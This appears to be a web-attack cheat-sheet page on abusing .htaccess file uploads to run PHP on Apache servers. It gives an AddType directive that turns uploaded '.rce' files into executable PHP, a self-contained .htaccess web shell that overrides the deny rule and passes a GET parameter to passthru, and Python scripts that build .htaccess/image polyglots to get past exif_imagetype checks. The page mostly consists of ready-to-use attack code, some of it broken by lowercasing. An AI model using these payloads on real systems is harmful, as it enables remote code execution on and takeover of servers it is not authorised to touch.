# .htaccess

uploading an .htaccess file to override apache rule and execute php.
"hackers can also use “.htaccess” file tricks to upload a malicious file with any extension and execute it. for a simple example, imagine uploading to the vulnerabler server an .htaccess file that has addtype application/x-httpd-php .htaccess configuration and also contains php shellcode. because of the malicious .htaccess file, the web server considers the .htaccess file as an executable php file and executes its malicious php shellcode. one thing to note: .htaccess configurations are applicable only for the same directory and sub-directories where the .htaccess file is uploaded."

## summary

* [addtype directive](#addtype-directive)
* [self contained .htaccess](#self-contained-htaccess)
* [polyglot .htaccess](#polyglot-htaccess)
* [references](#references)


## addtype directive

upload an .htaccess with : `addtype application/x-httpd-php .rce`   
then upload any file with `.rce` extension.


## self contained .htaccess

```python
# self contained .htaccess web shell - part of the htshell project
# written by wireghoul - http://www.justanotherhacker.com

# override default deny rule to make .htaccess file accessible over web
<files ~ "^\.ht">
order allow,deny
allow from all
</files>

# make .htaccess file be interpreted as php file. this occur after apache has interpreted
# the apache directives from the .htaccess file
addtype application/x-httpd-php .htaccess
```

```php
###### shell ######
<?php echo "\n";passthru($_get['c']." 2>&1"); ?>
```


## polyglot .htaccess

if the `exif_imagetype` function is used on the server side to determine the image type, create a `.htaccess/image` polyglot. 

[supported image types](http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) include [x bitmap (xbm)](https://en.wikipedia.org/wiki/x_bitmap) and [wbmp](https://en.wikipedia.org/wiki/wireless_application_protocol_bitmap_format). in `.htaccess` ignoring lines starting with `\x00` and `#`, you can use these scripts for generate a valid `.htaccess/image` polyglot.


* create valid `.htaccess/xbm` image
    ```python
    width = 50
    height = 50
    payload = '# .htaccess file'

    with open('.htaccess', 'w') as htaccess:
        htaccess.write('#define test_width %d\n' % (width, ))
        htaccess.write('#define test_height %d\n' % (height, ))
        htaccess.write(payload)
    ```

* create valid `.htaccess/wbmp` image
    ```python
    type_header = b'\x00'
    fixed_header = b'\x00'
    width = b'50'
    height = b'50'
    payload = b'# .htaccess file'

    with open('.htaccess', 'wb') as htaccess:
        htaccess.write(type_header + fixed_header + width + height)
        htaccess.write(b'\n')
        htaccess.write(payload)
    ```


## references

* [attacking webservers via .htaccess - eldar marcussen - may 17, 2011](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
* [protection from unrestricted file upload vulnerability - narendra shinde - october 22, 2015 ](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
* [insomnihack teaser 2019 / l33t-hoster - ian bouchard (@corb3nik) - january 20, 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
